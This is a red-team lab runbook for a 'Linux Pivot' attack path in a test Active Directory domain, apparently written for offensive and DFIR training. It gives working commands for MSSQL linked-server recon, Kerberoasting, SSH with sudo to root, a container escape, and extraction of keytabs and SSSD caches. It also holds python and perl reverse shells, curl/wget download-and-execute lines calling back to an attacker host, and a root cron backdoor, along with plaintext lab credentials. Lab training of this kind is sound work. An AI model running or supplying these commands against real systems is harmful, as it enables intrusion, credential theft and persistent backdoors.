# CAMPAIGNS v3 — Branch D — Linux Pivot

> **Campaign v3** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA-v2.md`](../CAMPAIGNS-METADATA-v2.md).
> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) · **Topology:** [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md)
> **DFIR track:** [`DFIR-Nexus-Pioneer-workflow.md`](../DFIR-Nexus-Pioneer-workflow.md)
>
> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.

**Default host:** Kali / provisioning (`192.168.77.60`) unless a step says otherwise.

---

### Branch D: Linux Pivot

> **Verification note (2026-08-01):** WT045–048 verified after SSSD keytab + sudo misconfig + NFS GSS fixes in `07-linux-config.yml` / `sql-integration-guide.md` §3.4/3.5.  
> **Revalidation (2026-08-22):** WT044 SQL hop ✅; **OS compromise ✅** as `cadre.local\mssql-linux01` (Kerberoast TGS from ws01 Rubeus + SSH SSSD + `sudo -n` → root + `/etc/krb5.keytab` / `mssql.keytab` readable). `analyst_t1` SSH to linux01 **fails**. Kali `nxc --kerberoasting` against this SPN is **`KDC_ERR_ETYPE_NOSUPP`** — use Rubeus on ws01. **`vagrant` is not this path.** WT045 dump / WT047 NFS mount / WT048 Podman **not re-run** 2026-08-22 (still 2026-08-01).

**Diverges from:** Phase 3 (MSSQL linked-server recon discovers linux01).  
**Converges to:** Phase 6 (domain credentials from linux01 help accelerate child DA).  
**Plan 1.1:** First-class branch graph (M3) — missing Linux-origin / linux01 endpoint fidelity is an **acceptable** trade-off; do not add provisioning monitoring.

**How linux01 is compromised (do not skip this):** two hops, two identities.

| Hop | Identity | What you get | What you do **not** get |
|-----|----------|----------------|-------------------------|
| **WT044** | `child\analyst_t1` → mbr01 SQL → linked `LINUX01` | Database list / optional `sa` **BULK** read of `mssql.keytab` | **No OS shell.** SQL Server Linux has no `xpstar.dll` / `xp_cmdshell`. |
| **OS** | `cadre.local\mssql-linux01` (SPN `MSSQLSvc/linux01.cadre.local:1433`) | SSH via SSSD → **`NOPASSWD:ALL` sudo → root** (`07-linux-config.yml`) | Not `analyst_t1` SSH. Not local `vagrant`. |

Root on the host is then: **(1) sudo as `mssql-linux01`** (primary, live 2026-08-22) or **(2) privileged Podman escape** (WT048 — LPE if sudo were absent). WT045/046/047 run **after** that shell.

#### Entry: MSSQL Linked Server Recon (WT044)

Verified live (2026-07-29; **re-run 2026-08-22** via `nxc mssql` 4-part query — `master`/`tempdb`/`model`/`msdb` on LINUX01). Use the single-line `-query` flag; do **not** use a multi-line `<<EOF` heredoc — `impacket-mssqlclient` treats the terminator as a stored procedure name and loops.

```bash
impacket-mssqlclient child.cadre.local/analyst_t1:'T13r_An@lyst!'@192.168.77.22 \
  -windows-auth -query "SELECT name FROM LINUX01.master.sys.databases"
```

For scripted automation, prefer a Python `pymssql` wrapper or the PowerShell `System.Data.SqlClient` path used in `T040-mssql-linked-server-hop-ws01.sh` / `T044-mssql-linux-lateral-ws01.sh`.

#### OS entry: Kerberoast `mssql-linux01` → SSH (required for a shell)

Account: `CN=mssql-linux01,OU=Cloud,DC=cadre,DC=local` — **cadre.local**, not child. Password is the AD object password from `02-ad-objects.yml` (also the Kerberoast crack target; add it to `ansible/files/cadre_passwords.txt`). Rule 3: TGS extraction is the validation; cracking is operator practice.

Kali NetExec RC4 roast of this user **fails** on Server 2025 (`KDC_ERR_ETYPE_NOSUPP`). Roast from **ws01** as a `cadre.local` principal (`hunter_dfir` or DA):

```text
Rubeus.exe kerberoast /user:mssql-linux01 /creduser:cadre.local\hunter_dfir /credpassword:<hunter_dfir> /creddomain:cadre.local /domain:cadre.local /dc:dc01.cadre.local /nowrap
```

Then SSH **that** user (SSSD). `sudo -n id` must return `uid=0(root)`:

```bash
# attack identity only — never vagrant
nxc ssh 192.168.77.40 -u mssql-linux01 -p '<mssql-linux01 AD password>' -x "id; sudo -n whoami"
```

**2026-08-22 live:** `uid=981601130(mssql-linux01)` `gid=domain users` on host `linux01`; `sudo -n` → `root`; `LINUX01$@CADRE.LOCAL` + `host/LINUX01@CADRE.LOCAL` in `/etc/krb5.keytab`; `MSSQL_KEYTAB_OK`.

#### After root: Podman Container Escape (WT048)

```bash
sudo podman exec cadre-monitor unshare -r id
sudo podman exec cadre-monitor cat /proc/1/root/root/.ssh/id_rsa
```

#### Phase 2: SSSD Ticket Extraction (WT045)

```bash
sudo cat /var/lib/sss/db/cache_cadre.local.ldb > /tmp/sssd_dump.ldb
klist -c /tmp/krb5cc_*
```

#### Phase 3: NFS Kerberos Mount (WT047)

```bash
# mount by FQDN (localhost breaks nfs/ SPN). Need TGT as mssql-linux01.
echo '<mssql-linux01 AD password>' | kinit mssql-linux01@CADRE.LOCAL
sudo env KRB5CCNAME="$KRB5CCNAME" mount -t nfs4 -o sec=krb5p \
  linux01.cadre.local:/exports/secure-share /mnt/cadre-nfs
```

#### Phase 4: MSSQL Keytab Extraction (WT046)

```bash
sudo klist -ket /var/opt/mssql/secrets/mssql.keytab
```

#### GTFOBins — Linux Privilege Escalation ⏳

**Source:** GTFOBins ([https://gtfobins.github.io/](https://gtfobins.github.io/))

Once on linux01, the following binaries can be used for privilege escalation, file read/write, and reverse shells. All are common on Ubuntu 24.04.

**Reverse shell via python3:**

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.77.60",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**Reverse shell via perl:**

```bash
perl -e 'use Socket;$i="192.168.77.60";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**File read via find (SUID bypass):**

```bash
find / -perm -4000 -type f 2>/dev/null  # Find SUID binaries
find . -exec /bin/sh \; -quit            # Shell via find
```

**File read via vim:**

```bash
vim -c ':!/bin/sh'                       # Shell escape from vim
vim -c ':!cat /etc/shadow'               # Read files as current user
```

**Command exec via awk:**

```bash
awk 'BEGIN {system("/bin/sh")}'          # Shell via awk
```

**Download via curl/wget:**

```bash
curl http://192.168.77.60:8080/payload.sh -o /tmp/payload.sh && chmod +x /tmp/payload.sh && /tmp/payload.sh
wget http://192.168.77.60:8080/payload.sh -O /tmp/payload.sh && chmod +x /tmp/payload.sh && /tmp/payload.sh
```

**File write via tee:**

```bash
echo "*/1 * * * * root /tmp/backdoor.sh" | sudo tee /etc/cron.d/backdoor
```

**Command exec via env:**

```bash
env /bin/sh                                # Shell via env
```

**Testing notes:**

- Attack identity on linux01 is **`mssql-linux01`** (SSSD, `NOPASSWD` sudo). **Do not** use `vagrant` — that account is lab config only.
- Test GTFOBins from `mssql-linux01` (with and without `sudo -n`).
- Compare with Branch D techniques (linked-server recon, Kerberoast+SSH, SSSD, NFS, keytab).

---

---

## Navigation

← Previous: [`CAMPAIGNS-RUNBOOK-branch-c.md`](CAMPAIGNS-RUNBOOK-branch-c.md) · Next: [`CAMPAIGNS-RUNBOOK-e.md`](CAMPAIGNS-RUNBOOK-e.md) →
